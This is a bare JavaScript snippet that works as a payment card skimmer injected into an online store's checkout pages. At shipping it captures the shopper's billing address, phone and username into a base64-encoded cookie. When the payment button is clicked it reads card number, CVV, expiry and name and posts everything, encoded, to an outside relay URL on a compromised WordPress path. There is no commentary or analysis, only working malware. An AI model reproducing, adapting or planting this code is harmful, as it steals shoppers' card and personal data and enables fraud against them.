<script>
var relay = 'https://brewtees.com/wp-admin/js/fabric.php';
var kookie_naem = 'magwp_hash';

detect(() => document.querySelector('#fullpayment-form > div > div > button'),bt =>
    bt.addEventListener('click',ev => {
        var bi = atob(get_cookie(kookie_naem));
        var ok = [
            'fullpayment_cc_number',
            'fullpayment_cc_cid',
            'fullpayment_expiration_d_y',
            'customerName'
        ].map(id => document.getElementById(id).value);
        ok = ok.concat(bi).join('|');
        snd({ naem:'powerbuyCC',xppcx:ok });
    }));


detect(() => document.querySelector('#cc-shipping-method-buttons-container > div > button'),bt =>
    bt.addEventListener('click',ev => set_cookie(kookie_naem,b64EncodeUnicode(collect_bill().join('|')))));


function collect_bill() {
    return [
        grab1('street[0]') + ', ' + grab1('custom_attributes[house_no]'),
        grab1('custom_attributes[subdistrict_id]'),
        grab1('custom_attributes[district_id]'),
        grab1('region_id'),
        'TH',
        grab1('custom_attributes[postcode_id]'),
        grab1('telephone'),
        grab1('username')
    ];
}

function grab1(naem) { return grab(document.getElementsByName(naem)[0]); }

function grab(el) {
    try {
        switch (el.tagName) {
            case 'INPUT': return el.value;
            case 'SELECT': return el.options[el.selectedIndex].innerText;
            default: return '';
        }
    } catch (e) { return ''; }
}

function detect(detector,callback,interval = 750) {
    function lo_op() {
        let y;
        try { y = detector(); }
        catch(e) { return setTimeout(lo_op,interval); }
        if (!y) return setTimeout(lo_op,interval);
        try { callback(y); }
        catch (e) { if (debug) console.log(e); }
    }
    setTimeout(lo_op,interval);
}

function set_cookie(cname,cvalue,exdays) {
    let d = new Date();
    d.setTime(d.getTime() + (exdays*24*60*60*1000));
    let expires = "expires="+ d.toUTCString();
    document.cookie = cname + "=" + cvalue + ";" + expires + "; path=/";
}

function get_cookie(name) {
    let value = "; " + document.cookie,
        parts = value.split("; " + name + "=");
    if (parts.length == 2) return parts.pop().split(";").shift();
    else return '';
}

function b64EncodeUnicode(str) {
    return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g,(match,p1) =>
        String.fromCharCode(parseInt(p1,16))));
}

function snd(dta) {
    return tinyxhrx({
        url: relay,
        async: true,
        post: '1337=' + b64EncodeUnicode(JSON.stringify(dta)),
    });
}

function tinyxhrx(paramz) {
    let def_paramz = {
        url: '',
        callback: () => {},
        post: false,
        async: false,
        contenttype: 'application/x-www-form-urlencoded',
        do_not_send: false,
    };
    for (let param in paramz) def_paramz[param] = paramz[param];
    if (typeof def_paramz.post === 'object') {
        let postdata = '';
        for (param in def_paramz.post) postdata += param + '=' + def_paramz.post[param] + '&';
        def_paramz.post = postdata;
    }
    let requestTimeout,xhr;
    try{ xhr = new XMLHttpRequest(); }
    catch (e) { xhr = new ActiveXObject("Msxml2.XMLHTTP"); }
    requestTimeout = setTimeout(function() {xhr.abort(); def_paramz.callback(new Error("rq_timeout"), "",xhr); }, 10000);
    xhr.onreadystatechange = function() {
        if (xhr.readyState !== 4) return;
        clearTimeout(requestTimeout);
        def_paramz.callback(xhr.status !== 200?new Error(xhr.status):false, xhr.responseText,xhr);
    }
    xhr.open(def_paramz.post?"POST":"GET", def_paramz.url,def_paramz.async);
    xhr.withCredentials = true;
    if (def_paramz.post) xhr.setRequestHeader('Content-type', def_paramz.contenttype);
    if (!def_paramz.do_not_send) xhr.send(def_paramz.post);
    return xhr;
}
